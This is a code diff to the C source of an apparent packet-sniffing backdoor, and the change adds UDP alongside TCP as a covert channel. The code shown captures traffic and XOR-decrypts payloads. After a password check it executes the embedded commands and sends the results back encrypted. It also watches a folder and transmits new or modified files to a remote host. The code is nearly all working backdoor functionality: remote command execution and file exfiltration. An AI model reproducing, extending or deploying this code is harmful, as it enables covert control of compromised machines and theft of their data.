@@ -19,7 +19,7 @@ static volatile sig_atomic_t doneflag = 0;
 -- 
 -- NOTES: Initializes packet capture on dst port or src host
 ----------------------------------------------------------------------------------------------------------------------*/
-int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port){
+int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port, int protocol){
 	
 	char nic_dev[BUFFER];		// NIC device name to monitor
 	pcap_if_t *alldevs, *temp; 	// NIC list variables
@@ -60,10 +60,14 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char 
 	}
 
 	/* Compiling the filter expression */
-	if(dst == FROM_CLIENT)
+	if(dst == FROM_CLIENT && protocol == TCP_PROTOCOL)
 		sprintf(filter_exp, "tcp and dst port %d", port);
-	if(dst == FROM_SERVER)	
-		sprintf(filter_exp, "tcp and src host %s", src_host);	
+	if(dst == FROM_SERVER && protocol == TCP_PROTOCOL)	
+		sprintf(filter_exp, "tcp and src host %s", src_host);
+	if(dst == FROM_CLIENT && protocol == UDP_PROTOCOL)
+		sprintf(filter_exp, "udp and dst port %d", port);
+	if(dst == FROM_SERVER && protocol == UDP_PROTOCOL)
+		sprintf(filter_exp, "udp and src host %s", src_host);	
 	
 	if(pcap_compile(nic_descr, &fp, filter_exp, 0, netp))
 	{
@@ -127,10 +131,12 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 {		
 	const struct ip_struct * ip;
 	const struct tcp_struct * tcp;
+	const struct udp_struct * udp;
 	const unsigned char * payload;
 
 	int size_ip;
 	int size_tcp;
+	int size_udp;
 	int size_payload;
 	int mode;
 
@@ -147,26 +153,36 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		fprintf(stderr, "Invalid IP header length: %u bytes\n", size_ip);
 		return;
 	}
-
-	/* print source and destination IP addresses */
-	//printf("       From: %s\n", inet_ntoa(ip->ip_src));
-	//printf("         To: %s\n", inet_ntoa(ip->ip_dst));
-
-	if(ip->ip_p != IPPROTO_TCP)
-		return;
-
-	/* define/compute tcp header offset */
-	tcp = (struct tcp_struct *)(packet + SIZE_ETHERNET + size_ip);
-	size_tcp = TH_OFF(tcp) * 4;
 	
-	if (size_tcp < 20) {
-		fprintf(stderr, "Invalid TCP header length: %u bytes\n", size_tcp);
-		return;
+	/* if the packet is neither TCP nor UDP */	
+	if(ip->ip_p == IPPROTO_TCP)
+	{
+
+		/* define/compute tcp header offset */
+		tcp = (struct tcp_struct *)(packet + SIZE_ETHERNET + size_ip);
+		size_tcp = TH_OFF(tcp) * 4;
+	
+		if (size_tcp < 20) {
+			fprintf(stderr, "Invalid TCP header length: %u bytes\n", size_tcp);
+			return;
+		}
+
+		/* define/compute tcp payload (segment) offset */
+		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+		size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
+	}
+	if(ip->ip_p == IPPROTO_UDP)
+	{
+		
+		/* define/compute udp header offset */
+		udp = (struct udp_struct *)(packet + SIZE_ETHERNET + size_ip);
+		size_udp = 8;
+
+		/* define/compute udp payload (segment) offset */
+		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);
+		size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);
 	}
 
-	/* define/compute tcp payload (segment) offset */
-	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 	/* Decrypt the payload */
 	iSeed(xor_key, 1);
 	decrypted = xor_cipher((char *)payload, size_payload);
@@ -183,7 +199,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
-		process_command(command, ip, ntohs(tcp->th_sport));
+		process_command(command, ip, ip->ip_p == IPPROTO_TCP ? ntohs(tcp->th_sport) : ntohs(udp->uh_sport), ip->ip_p);
 		free(command);
 		free(decrypted);
 		return;
@@ -309,7 +325,7 @@ int parse_cmd(char * command, char * data)
 -- 
 -- NOTES: Processes a command and gets the results.  encrypts and sends packet of results to originating host
 ----------------------------------------------------------------------------------------------------------------------*/
-int process_command(char * command, const struct ip_struct * ip, const int dest_port)
+int process_command(char * command, const struct ip_struct * ip, const int dest_port, int protocol)
 {
 	FILE *fp;
 
@@ -337,7 +353,7 @@ int process_command(char * command, const struct ip_struct * ip, const int dest_
 		
 		//Send it over to the client
 		iSeed(xor_key, 1);
-		send_packet(xor_cipher(packet, strlen(packet)), strlen(packet), src, dst, dest_port);
+		send_packet(xor_cipher(packet, strlen(packet)), protocol, strlen(packet), src, dst, dest_port);
 		
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
@@ -347,7 +363,7 @@ int process_command(char * command, const struct ip_struct * ip, const int dest_
 	return 0;
 }
 
-int send_file_data(const char* folder, const char * fileName, const char * src_ip, const char * dest_ip, const int dest_port){
+int send_file_data(const char* folder, const char * fileName, const char * src_ip, const char * dest_ip, const int dest_port, int protocol){
 	FILE* fp;
 	char data[PKT_SIZE];
 	int count = 0;
@@ -376,7 +392,7 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 		
 		//Send it over to the client
 		iSeed(xor_key, 1);
-		send_packet(xor_cipher(packet, strlen(packet)), strlen(packet), src_ip, dest_ip, dest_port);
+		send_packet(xor_cipher(packet, strlen(packet)), protocol, strlen(packet), src_ip, dest_ip, dest_port);
 		
 		memset(packet, 0, sizeof(packet));
 		memset(data, 0, sizeof(data));
@@ -389,7 +405,7 @@ int send_file_data(const char* folder, const char * fileName, const char * src_i
 	return 0;
 }
 
-int initFileMonitor(const char * folder, const char* src_ip, const char* dest_ip, const int dest_port){
+int initFileMonitor(const char * folder, const char* src_ip, const char* dest_ip, const int dest_port, int protocol){
 	
 	int len, i, ret, fd, wd;
 //	struct timeval time;
@@ -463,7 +479,7 @@ int initFileMonitor(const char * folder, const char* src_ip, const char* dest_ip
 		{
 			if (event->mask & IN_MODIFY || event->mask & IN_CREATE){
 				
-				send_file_data(folder, event->name, src_ip, dest_ip, dest_port);
+				send_file_data(folder, event->name, src_ip, dest_ip, dest_port, protocol);
 			}
 
 
